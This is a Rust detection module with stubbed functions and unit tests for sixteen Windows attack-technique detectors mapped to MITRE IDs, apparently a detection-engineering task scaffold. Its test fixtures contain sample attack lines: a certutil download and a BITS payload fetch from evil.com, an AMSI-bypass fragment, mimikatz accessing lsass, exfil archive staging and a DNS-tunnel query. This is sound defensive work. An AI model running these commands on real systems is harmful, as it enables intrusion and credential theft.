//! Detection use cases: 16 TTP detectors operating on parsed EvtxEvent slices.

use winevt_core::EvtxEvent;

/// Confidence level of a detection.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Confidence {
    Low,
    Medium,
    High,
}

/// A single detection hit from a TTP detector.
#[derive(Debug, Clone)]
pub struct Detection {
    pub technique: &'static str,
    pub mitre_technique_id: &'static str,
    pub tactic: &'static str,
    pub confidence: Confidence,
    pub evidence: Vec<EvtxEvent>,
    pub description: String,
}

pub fn detect_kerberoasting(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_asrep_roasting(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_dcsync(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_lsass_access(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_psexec(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_scheduled_task_abuse(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_service_persistence(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_wmi_subscription(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_lolbas(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_amsi_bypass(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_defender_tampering(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_smb_lateral_movement(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_pass_the_hash(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_bits_persistence(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_compression_staging(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn detect_dns_cloud_exfil(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }
pub fn run_all_detectors(events: &[EvtxEvent]) -> Vec<Detection> { todo!() }

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    fn make_event(event_id: u32, channel: &str, data: Vec<(&str, &str)>, ts: i64) -> EvtxEvent {
        EvtxEvent {
            event_id, channel: channel.into(), timestamp_ns: ts, computer: "DC01".into(),
            user_sid: None, logon_id: None, process_id: None, thread_id: None,
            data: data.into_iter().map(|(k, v)| (k.into(), v.into())).collect(),
        }
    }

    #[test]
    fn kerberoasting_detected_on_rc4_tgs() {
        let ev = vec![make_event(4769, "Security", vec![("TicketEncryptionType","0x17"),("ServiceName","MSSQLSvc/srv"),("TargetUserName","svc")], 1_000_000_000)];
        let hits = detect_kerberoasting(&ev);
        assert!(!hits.is_empty(), "RC4 TGS should be flagged");
        assert_eq!(hits[0].mitre_technique_id, "T1558.003");
    }
    #[test]
    fn kerberoasting_ignores_aes_tickets() {
        let ev = vec![make_event(4769, "Security", vec![("TicketEncryptionType","0x12"),("ServiceName","MSSQLSvc/srv"),("TargetUserName","svc")], 1_000)];
        assert!(detect_kerberoasting(&ev).is_empty());
    }
    #[test]
    fn kerberoasting_empty_events() { assert!(detect_kerberoasting(&[]).is_empty()); }

    #[test]
    fn asrep_detected_on_preauth_disabled() {
        let ev = vec![make_event(4768, "Security", vec![("PreAuthType","0"),("TargetUserName","nopa")], 1_000_000_000)];
        let hits = detect_asrep_roasting(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1558.004");
    }
    #[test]
    fn asrep_ignores_normal_tgt() {
        let ev = vec![make_event(4768, "Security", vec![("PreAuthType","2"),("TargetUserName","normaluser")], 1_000)];
        assert!(detect_asrep_roasting(&ev).is_empty());
    }

    #[test]
    fn dcsync_detected_on_replication_guid() {
        let ev = vec![make_event(4662, "Security", vec![("Properties","{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}"),("SubjectUserName","attacker"),("SubjectUserSid","S-1-5-21-999-1001")], 1_000_000_000)];
        let hits = detect_dcsync(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1003.006");
    }
    #[test]
    fn dcsync_empty_events() { assert!(detect_dcsync(&[]).is_empty()); }

    #[test]
    fn lsass_access_detected_on_dump_mask() {
        let ev = vec![make_event(10, "Microsoft-Windows-Sysmon/Operational", vec![("TargetImage","C:\\Windows\\System32\\lsass.exe"),("GrantedAccess","0x1010"),("SourceImage","C:\\Users\\attacker\\mimikatz.exe")], 1_000_000_000)];
        let hits = detect_lsass_access(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1003.001");
    }
    #[test]
    fn lsass_access_ignores_normal_mask() {
        let ev = vec![make_event(10, "Microsoft-Windows-Sysmon/Operational", vec![("TargetImage","C:\\Windows\\System32\\lsass.exe"),("GrantedAccess","0x0400"),("SourceImage","C:\\Windows\\System32\\svchost.exe")], 1_000)];
        assert!(detect_lsass_access(&ev).is_empty());
    }

    #[test]
    fn psexec_detected_on_psexesvc() {
        let ev = vec![make_event(7045, "System", vec![("ServiceName","PSEXESVC"),("ImagePath","C:\\Windows\\PSEXESVC.exe")], 1_000_000_000)];
        let hits = detect_psexec(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1569.002");
    }

    #[test]
    fn scheduled_task_registered_detected() {
        let ev = vec![make_event(106, "Microsoft-Windows-TaskScheduler/Operational", vec![("TaskName","\\malicious_task")], 1_000_000_000)];
        let hits = detect_scheduled_task_abuse(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1053.005");
    }
    #[test]
    fn scheduled_task_empty() { assert!(detect_scheduled_task_abuse(&[]).is_empty()); }

    #[test]
    fn service_persistence_detected_on_7045() {
        let ev = vec![make_event(7045, "System", vec![("ServiceName","evil_svc"),("ImagePath","C:\\Users\\attacker\\evil.exe")], 1_000_000_000)];
        let hits = detect_service_persistence(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1543.003");
    }

    #[test]
    fn wmi_subscription_detected_on_5861() {
        let ev = vec![make_event(5861, "Microsoft-Windows-WMI-Activity/Operational", vec![("Consumer","CommandLineEventConsumer")], 1_000_000_000)];
        let hits = detect_wmi_subscription(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1546.003");
    }

    #[test]
    fn lolbas_detected_on_certutil() {
        let ev = vec![make_event(4688, "Security", vec![("NewProcessName","C:\\Windows\\System32\\certutil.exe"),("CommandLine","certutil -urlcache http://evil.com/p")], 1_000_000_000)];
        let hits = detect_lolbas(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1218");
    }

    #[test]
    fn amsi_bypass_detected_on_script_block() {
        let ev = vec![make_event(4104, "Microsoft-Windows-PowerShell/Operational", vec![("ScriptBlockText","[Ref].Assembly.GetType(amsiInitFailed)")], 1_000_000_000)];
        let hits = detect_amsi_bypass(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1562.001");
    }

    #[test]
    fn defender_tampering_detected_on_disable_realtime() {
        let ev = vec![make_event(5001, "Microsoft-Windows-Windows Defender/Operational", vec![("Value","disabled")], 1_000_000_000)];
        let hits = detect_defender_tampering(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1562.001");
    }

    #[test]
    fn smb_lateral_movement_detected_on_type3_plus_5140() {
        let ts = 1_000_000_000_i64;
        let mut ld: HashMap<String,String> = HashMap::new();
        ld.insert("LogonType".into(), "3".into());
        ld.insert("IpAddress".into(), "10.0.0.5".into());
        ld.insert("TargetLogonId".into(), "0x1234".into());
        let mut sd: HashMap<String,String> = HashMap::new();
        sd.insert("ShareName".into(), "\\\\*\\ADMIN$".into());
        sd.insert("SubjectLogonId".into(), "0x1234".into());
        let events = vec![
            EvtxEvent { event_id: 4624, channel: "Security".into(), timestamp_ns: ts, computer: "WS01".into(), user_sid: None, logon_id: Some(0x1234), process_id: None, thread_id: None, data: ld },
            EvtxEvent { event_id: 5140, channel: "Security".into(), timestamp_ns: ts+1000, computer: "WS01".into(), user_sid: None, logon_id: Some(0x1234), process_id: None, thread_id: None, data: sd },
        ];
        let hits = detect_smb_lateral_movement(&events);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1021.002");
    }

    #[test]
    fn pass_the_hash_detected_on_logontype9() {
        let ev = vec![make_event(4624, "Security", vec![("LogonType","9"),("AuthenticationPackageName","NTLM"),("TargetUserName","Administrator")], 1_000_000_000)];
        let hits = detect_pass_the_hash(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1550.002");
    }

    #[test]
    fn bits_persistence_detected_on_eid_59() {
        let ev = vec![make_event(59, "Microsoft-Windows-Bits-Client/Operational", vec![("url","http://evil.com/payload.exe")], 1_000_000_000)];
        let hits = detect_bits_persistence(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1197");
    }

    #[test]
    fn compression_staging_detected_on_7z() {
        let ev = vec![make_event(1, "Microsoft-Windows-Sysmon/Operational", vec![("Image","C:\\Program Files\\7-Zip\\7z.exe"),("CommandLine","7z.exe a exfil.7z C:\\sensitive\\")], 1_000_000_000)];
        let hits = detect_compression_staging(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1560.001");
    }

    #[test]
    fn dns_exfil_detected_on_high_entropy_subdomain() {
        let ev = vec![make_event(22, "Microsoft-Windows-Sysmon/Operational", vec![("QueryName","aGVsbG93b3JsZHRlc3RkYXRh.evil-tunnel.com")], 1_000_000_000)];
        let hits = detect_dns_cloud_exfil(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1048.003");
    }

    #[test]
    fn run_all_detectors_empty_events_returns_empty() {
        assert!(run_all_detectors(&[]).is_empty());
    }

    #[test]
    fn run_all_detectors_aggregates_multiple_detections() {
        let events = vec![
            make_event(4769, "Security", vec![("TicketEncryptionType","0x17"),("ServiceName","MSSQLSvc/srv"),("TargetUserName","svc")], 1_000),
            make_event(5001, "Microsoft-Windows-Windows Defender/Operational", vec![("Value","disabled")], 2_000),
        ];
        assert!(run_all_detectors(&events).len() >= 2);
    }
}
